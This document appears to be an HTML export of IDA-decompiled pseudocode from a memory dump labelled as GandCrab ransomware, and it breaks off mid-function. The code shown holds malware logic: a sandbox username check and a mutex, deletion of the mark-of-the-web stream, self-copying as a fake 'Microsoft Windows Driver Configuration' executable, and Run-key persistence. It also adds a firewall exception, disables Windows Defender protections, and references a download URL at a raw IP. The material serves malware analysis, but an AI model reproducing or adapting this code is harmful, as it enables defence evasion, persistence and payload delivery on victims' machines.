<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>IDA - windrvcfg.DMP.idb (windrvcfg.DMP) C:\Users\Administrator\Desktop\Analysis\2019_analysis\20190206_GrandCrab_Dump\windrvcfg.DMP.idb</title>
</head>
<body bgcolor="#aaffff">
<span style="white-space: pre; font-family: Courier; color: blue; background: #aaffff">

<span style="color:gray">void __noreturn My_1_DownLoad()
</span><span style="color:navy">{
  </span><span style="color:black">int v0</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">eax
  </span><span style="color:gray">char v1</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+5Ch] [ebp-1508h]
  </span><span style="color:black">unsigned int m</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+258h] [ebp-130Ch]
  </span><span style="color:black">unsigned int l</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+25Ch] [ebp-1308h]
  </span><span style="color:black">unsigned int k</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+260h] [ebp-1304h]
  </span><span style="color:black">unsigned int j</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+264h] [ebp-1300h]
  </span><span style="color:black">unsigned int i</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+268h] [ebp-12FCh]
  </span><span style="color:black">unsigned int v7</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+26Ch] [ebp-12F8h]
  </span><span style="color:gray">HANDLE v8</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+270h] [ebp-12F4h]
  </span><span style="color:black">unsigned __int16 v9[500]</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+274h] [ebp-12F0h]
  </span><span style="color:black">wchar_t *v10</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+65Ch] [ebp-F08h]
  </span><span style="color:black">wchar_t *v11</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+660h] [ebp-F04h]
  </span><span style="color:black">wchar_t *v12</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+664h] [ebp-F00h]
  </span><span style="color:black">wchar_t *v13</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+668h] [ebp-EFCh]
  </span><span style="color:black">WCHAR v14[262]</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+66Ch] [ebp-EF8h]
  </span><span style="color:gray">int v15</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+878h] [ebp-CECh]
  </span><span style="color:gray">char v16</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+87Ch] [ebp-CE8h]
  </span><span style="color:gray">char v17</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+A74h] [ebp-AF0h]
  </span><span style="color:black">char *v18</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C7Ch] [ebp-8E8h]
  </span><span style="color:black">char *v19</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C80h] [ebp-8E4h]
  </span><span style="color:black">char *v20</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C84h] [ebp-8E0h]
  </span><span style="color:black">char *v21</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C88h] [ebp-8DCh]
  </span><span style="color:black">char *v22</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C8Ch] [ebp-8D8h]
  </span><span style="color:black">char *str_92_63_197_153</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C90h] [ebp-8D4h]
  </span><span style="color:black">char *v24</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C94h] [ebp-8D0h]
  </span><span style="color:black">HKEY v25</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C98h] [ebp-8CCh]
  </span><span style="color:black">WCHAR v26[260]</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C9Ch] [ebp-8C8h]
  </span><span style="color:black">unsigned __int16 v27[262]</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+EA4h] [ebp-6C0h]
  </span><span style="color:gray">char v28</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+10B0h] [ebp-4B4h]
  </span><span style="color:gray">char v29</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+10BCh] [ebp-4A8h]
  </span><span style="color:gray">char v30</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+110Ch] [ebp-458h]
  </span><span style="color:gray">char v31</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+1318h] [ebp-24Ch]
  </span><span style="color:black">wchar_t *v32</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+1334h] [ebp-230h]
  </span><span style="color:black">wchar_t *v33</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+1338h] [ebp-22Ch]
  </span><span style="color:black">wchar_t *v34</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+133Ch] [ebp-228h]
  </span><span style="color:black">wchar_t *v35</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+1340h] [ebp-224h]
  </span><span style="color:black">wchar_t *v36</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+1344h] [ebp-220h]
  </span><span style="color:black">wchar_t *v37</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+1348h] [ebp-21Ch]
  </span><span style="color:black">wchar_t *v38</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+134Ch] [ebp-218h]
  </span><span style="color:black">LONG v39</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+1350h] [ebp-214h]
  </span><span style="color:gray">char v40</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+1354h] [ebp-210h]
  </span><span style="color:gray">int v41</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+1358h] [ebp-20Ch]
  </span><span style="color:gray">char v42</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+135Ch] [ebp-208h]

  </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x3E8u</span><span style="color:navy">);
  </span>j_memset<span style="color:navy">(</span><span style="color:#8080ff">v9</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">1000</span><span style="color:navy">);
  </span><span style="color:#8080ff">v15 </span><span style="color:navy">= </span><span style="color:#00aa00">500</span><span style="color:navy">;
  </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>GetUserNameW<span style="color:navy">(</span><span style="color:#8080ff">v9</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">) )
  {
    </span><span style="color:#8080ff">v7 </span><span style="color:navy">= </span>wcslen<span style="color:navy">(</span><span style="color:#8080ff">v9</span><span style="color:navy">);
    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v7 </span><span style="color:navy">== </span><span style="color:#00aa00">13 </span><span style="color:navy">)
      </span>ExitProcess<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">500u</span><span style="color:navy">);
  </span>strcpy<span style="color:navy">(&amp;</span><span style="color:#8080ff">v28</span><span style="color:navy">, &quot;</span><span style="color:green">30405005&quot;</span><span style="color:navy">);
  </span>qmemcpy<span style="color:navy">(&amp;</span><span style="color:#8080ff">v31</span><span style="color:navy">, </span>aWindrvcfgExe<span style="color:navy">, </span><span style="color:#00aa00">0x1Cu</span><span style="color:navy">);          </span><span style="color:green">// windrvcfg.exe
  </span>qmemcpy<span style="color:navy">(&amp;</span><span style="color:#8080ff">v29</span><span style="color:navy">, </span>aMicrosoftWindo<span style="color:navy">, </span><span style="color:#00aa00">0x4Eu</span><span style="color:navy">);        </span><span style="color:green">// Microsoft Windows Driver Configuration
  </span><span style="color:#8080ff">v18 </span><span style="color:navy">= </span>a1Exe<span style="color:navy">;                                  </span><span style="color:green">// 1.exe
  </span><span style="color:#8080ff">v19 </span><span style="color:navy">= </span>a2Exe<span style="color:navy">;                                  </span><span style="color:green">// 2.exe
  </span><span style="color:#8080ff">v20 </span><span style="color:navy">= </span>a3Exe<span style="color:navy">;                                  </span><span style="color:green">// 3.exe
  </span><span style="color:#8080ff">v21 </span><span style="color:navy">= </span>a4Exe<span style="color:navy">;                                  </span><span style="color:green">// 4.exe
  </span><span style="color:#8080ff">v22 </span><span style="color:navy">= </span>a5Exe<span style="color:navy">;                                  </span><span style="color:green">// 5.exe
  </span><span style="color:#8080ff">v10 </span><span style="color:navy">= </span>aWindir<span style="color:navy">;                                </span><span style="color:green">// %windir%
  </span><span style="color:#8080ff">v11 </span><span style="color:navy">= </span>aUserprofile<span style="color:navy">;                           </span><span style="color:green">// %userprofile%
  </span><span style="color:#8080ff">v12 </span><span style="color:navy">= </span>aAppdata<span style="color:navy">;                               </span><span style="color:green">// %appdata%
  </span><span style="color:#8080ff">v13 </span><span style="color:navy">= </span>aTemp<span style="color:navy">;                                  </span><span style="color:green">// %temp%
  </span><span style="color:#8080ff">v32 </span><span style="color:navy">= </span>aAntivirusoverr<span style="color:navy">;                        </span><span style="color:green">// AntiVirusOverride
  </span><span style="color:#8080ff">v33 </span><span style="color:navy">= </span>aUpdatesoverrid<span style="color:navy">;                        </span><span style="color:green">// UpdatesOverride
  </span><span style="color:#8080ff">v34 </span><span style="color:navy">= </span>aFirewalloverri<span style="color:navy">;                        </span><span style="color:green">// FirewallOverride
  </span><span style="color:#8080ff">v35 </span><span style="color:navy">= </span>aAntivirusdisab<span style="color:navy">;                        </span><span style="color:green">// AntiVirusDisableNotify
  </span><span style="color:#8080ff">v36 </span><span style="color:navy">= </span>aUpdatesdisable<span style="color:navy">;                        </span><span style="color:green">// UpdatesDisableNotify
  </span><span style="color:#8080ff">v37 </span><span style="color:navy">= </span>aAutoupdatedisa<span style="color:navy">;                        </span><span style="color:green">// AutoUpdateDisableNotify
  </span><span style="color:#8080ff">v38 </span><span style="color:navy">= </span>aFirewalldisabl<span style="color:navy">;                        </span><span style="color:green">// FirewallDisableNotify
  </span><span style="color:#8080ff">str_92_63_197_153 </span><span style="color:navy">= </span>aHttp9263197153<span style="color:navy">;          </span><span style="color:green">// http://92.63.197.153/m/
  </span><span style="color:#8080ff">v24 </span><span style="color:navy">= </span>aHttp9263197153_0<span style="color:navy">;                      </span><span style="color:green">// http://92.63.197.153/m/
  </span><span style="color:#8080ff">v8 </span><span style="color:navy">= </span>CreateMutexA<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v28</span><span style="color:navy">);
  </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>GetLastError<span style="color:navy">() == </span><span style="color:#00aa00">183 </span><span style="color:navy">)
    </span>ExitProcess<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">);
  </span><span style="color:#8080ff">v25 </span><span style="color:navy">= </span><span style="color:#00aa00">0</span><span style="color:navy">;
  </span><span style="color:#8080ff">v41 </span><span style="color:navy">= </span><span style="color:#00aa00">1</span><span style="color:navy">;
  </span>j_memset<span style="color:navy">(</span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
  </span>j_memset<span style="color:navy">(</span><span style="color:#8080ff">v27</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
  </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v17</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
  </span>GetModuleFileNameW<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#00aa00">0x208u</span><span style="color:navy">);
  </span>j_snwprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v17</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, </span>aLsZoneIdentifi<span style="color:navy">, </span><span style="color:#8080ff">v26</span><span style="color:navy">); </span><span style="color:green">// %ls:Zone.Identifier
  </span>DeleteFileW<span style="color:navy">(&amp;</span><span style="color:#8080ff">v17</span><span style="color:navy">);
  </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">500u</span><span style="color:navy">);
  </span><span style="color:#00aa00">for </span><span style="color:navy">( </span><span style="color:#8080ff">i </span><span style="color:navy">= </span><span style="color:#00aa00">0</span><span style="color:navy">; </span><span style="color:#8080ff">i &lt; </span><span style="color:#00aa00">4</span><span style="color:navy">; ++</span><span style="color:#8080ff">i </span><span style="color:navy">)
  {
    </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v30</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
    </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v42</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
    </span>j_memset<span style="color:navy">(</span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
    </span>ExpandEnvironmentStringsW<span style="color:navy">((&amp;</span><span style="color:#8080ff">v10</span><span style="color:navy">)[</span><span style="color:#8080ff">i</span><span style="color:navy">], &amp;</span><span style="color:#8080ff">v30</span><span style="color:navy">, </span><span style="color:#00aa00">0x208u</span><span style="color:navy">);
    </span>j_snwprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v42</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, </span>aLs405969640305<span style="color:navy">, &amp;</span><span style="color:#8080ff">v30</span><span style="color:navy">);
    </span>j_snwprintf<span style="color:navy">(</span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, </span>aLsLs<span style="color:navy">, &amp;</span><span style="color:#8080ff">v42</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v31</span><span style="color:navy">);
    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>PathFileExistsW<span style="color:navy">(</span><span style="color:#8080ff">v14</span><span style="color:navy">) )
      </span><span style="color:#00aa00">break</span><span style="color:navy">;
    </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>PathFileExistsW<span style="color:navy">(&amp;</span><span style="color:#8080ff">v42</span><span style="color:navy">) )
      </span>CreateDirectoryW<span style="color:navy">(&amp;</span><span style="color:#8080ff">v42</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>CopyFileW<span style="color:navy">(</span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">) )
      </span><span style="color:#00aa00">break</span><span style="color:navy">;
    </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
  </span>j_snwprintf<span style="color:navy">(</span><span style="color:#8080ff">v27</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, </span>aLsEnabledS<span style="color:navy">, </span><span style="color:#8080ff">v14</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v29</span><span style="color:navy">);
  </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>wcscmp<span style="color:navy">(</span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#8080ff">v14</span><span style="color:navy">) )
  {
    </span>SetFileAttributesW<span style="color:navy">(&amp;</span><span style="color:#8080ff">v42</span><span style="color:navy">, </span><span style="color:#00aa00">7u</span><span style="color:navy">);
    </span>SetFileAttributesW<span style="color:navy">(</span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">7u</span><span style="color:navy">);
    </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwareMicros_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )
    {                                           </span><span style="color:green">// SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
      </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v29</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">1u</span><span style="color:navy">, </span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">2 </span><span style="color:navy">* </span>wcslen<span style="color:navy">(</span><span style="color:#8080ff">v14</span><span style="color:navy">) + </span><span style="color:#00aa00">2</span><span style="color:navy">);
      </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
    </span><span style="background:navy"></span><span style="color:navy">}
    </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_CURRENT_USER<span style="color:navy">, </span>aSoftwareMicros<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )
    {                                           </span><span style="color:green">// Software\Microsoft\Windows\CurrentVersion\Run\
      </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v29</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">1u</span><span style="color:navy">, </span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">2 </span><span style="color:navy">* </span>wcslen<span style="color:navy">(</span><span style="color:#8080ff">v14</span><span style="color:navy">) + </span><span style="color:#00aa00">2</span><span style="color:navy">);
      </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
    </span><span style="background:navy"></span><span style="color:navy">}
    </span>My_CreateProc<span style="color:navy">(</span><span style="color:#8080ff">v14</span><span style="color:navy">);
    </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">500u</span><span style="color:navy">);
    </span>ExitProcess<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
  </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSystemCurrentc<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )
  {                                             </span><span style="color:green">// SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\
    </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
      </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span><span style="color:#8080ff">v14</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">1u</span><span style="color:navy">, </span><span style="color:#8080ff">v27</span><span style="color:navy">, </span><span style="color:#00aa00">2 </span><span style="color:navy">* </span>wcslen<span style="color:navy">(</span><span style="color:#8080ff">v27</span><span style="color:navy">) + </span><span style="color:#00aa00">2</span><span style="color:navy">);
    </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwarePolici_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )
  {                                             </span><span style="color:green">// SOFTWARE\Policies\Microsoft\Windows Defender\
    </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisableantispy<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);</span><span style="color:green">// DisableAntiSpyware

    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
      </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisableantispy_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v41</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">);

    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwarePolici_1<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )</span><span style="color:green">// SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
      </span>RegCreateKeyExA<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwarePolici<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0x20006u</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);</span><span style="color:green">// SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
    </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwarePolici_2<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )</span><span style="color:green">// SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
    </span><span style="color:navy">{
      </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisablescanonr<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);</span><span style="color:green">// DisableScanOnRealtimeEnable
      </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
        </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisablescanonr_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v41</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">);
      </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisableonacces<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);</span><span style="color:green">// DisableOnAccessProtection
      </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
        </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisableonacces_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v41</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">);
      </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisablebehavio<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);</span><span style="color:green">// DisableBehaviorMonitoring
      </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
        </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisablebehavio_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v41</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">);
      </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
    </span><span style="background:navy"></span><span style="color:navy">}
    </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwareMicros_1<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )
  {                                             </span><span style="color:green">// SOFTWARE\Microsoft\Security Center\
    </span><span style="color:#00aa00">for </span><span style="color:navy">( </span><span style="color:#8080ff">j </span><span style="color:navy">= </span><span style="color:#00aa00">0</span><span style="color:navy">; </span><span style="color:#8080ff">j &lt; </span><span style="color:#00aa00">7</span><span style="color:navy">; ++</span><span style="color:#8080ff">j </span><span style="color:navy">)
    {
      </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, (&amp;</span><span style="color:#8080ff">v32</span><span style="color:navy">)[</span><span style="color:#8080ff">j</span><span style="color:navy">], </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);</span><span style="color:green">// AntiVirusOverride
      </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
